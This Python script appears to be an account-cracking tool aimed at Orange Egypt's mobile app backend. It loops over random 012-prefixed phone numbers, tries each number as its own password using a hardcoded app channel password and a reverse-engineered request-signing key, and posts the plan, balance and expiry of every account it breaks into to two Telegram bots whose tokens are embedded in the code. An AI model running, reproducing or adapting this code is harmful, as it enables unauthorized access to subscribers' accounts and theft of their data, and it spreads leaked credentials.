import requests
import random
import hashlib
import telebot
import threading
bot = telebot.TeleBot("7080628499:AAGGjW4oSffgggeyEUUJEVl6bcmeSlpIuOI")
id = '5611407285'
########
bot1 = telebot.TeleBot("7113957907:AAHuXdOqzWpOEOy6CRwOaNECRwAg8bCibmc")
id1 = '7037898496'
def random_number():
    return "012{}".format(random.randint(10000000, 99999999))

def El_htv(ctv):
    key_htv = ',{.c][o^uecnlkijh*.iomv:QzCFRcd;drof/zx}w;ls.e85T^#ASwa?=(lk'
    return hashlib.sha256((ctv + key_htv).encode('utf-8')).hexdigest().upper()

def send_order():
    num = random_number()
    url = "https://services.orange.eg/GetToken.svc/GenerateToken"
    headers = {
        "x-microservice-name": "APMS",
        "Content-Type":
		"application/json; charset=UTF-8",
        "Content-Length": "78",
        "Host": "services.orange.eg",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/3.14.9"
    }
    data={
	  "channel": {
	    "ChannelName": "MobinilAndMe",
	    "Password": "ig3yh*mk5l42@oj7QAR8yF"
	  }
	}
    try:
        token = requests.post(url, headers=headers, json=data).json()['GenerateTokenResult']['Token']
        htv = El_htv(token)
        url = "https://backend.orange.eg/api/V2/Account/GetDialInfo"
        headers = {
            "_ctv": token,
            "_htv": htv,
            "OsVersion": "Android9",
            "AppVersion": "740",
            "IsEasyLogin": "false",
            "IsAndroid": "true",
            "x-microservice-name": "APMS",
            "Content-Type":"application/json; charset=UTF-8",
            "Content-Length": "190",
            "Host": "backend.orange.eg",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/3.14.9",
        }
        data = {
            "channel": {
                "ChannelName": "MobinilAndMe",
                "Password": "ig3yh*mk5l42@oj7QAR8yF"
            },
            "CurrentVersion": "740",
            "dial": num,
            "isCoin": "true",
            "lang": "ar",
            "isEasyLogin": "false",
            "password": num
        }
        res = requests.post(url, headers=headers, json=data).json()
        message = f'PlanName :{res["PlanName"]}\nNumber : `{num}`\nExpiryDate : {res["ExpiryDate"]}\nBalance : {res["Balance"]}\n'
        
        if res['ErrorDescription'] == 'dial does not match the password':
            print(f"wrong number : {num}")
            
        else:
            bot.send_message(id, message,parse_mode='markdownV2')
            bot1.send_message(id1, message,parse_mode='markdownV2')
            print("done successfully")
            
    except :
         print(f"wrong number : {num}")
while True:
	send_order()	
#	threading.Thread(target=send_order,args=[]).start()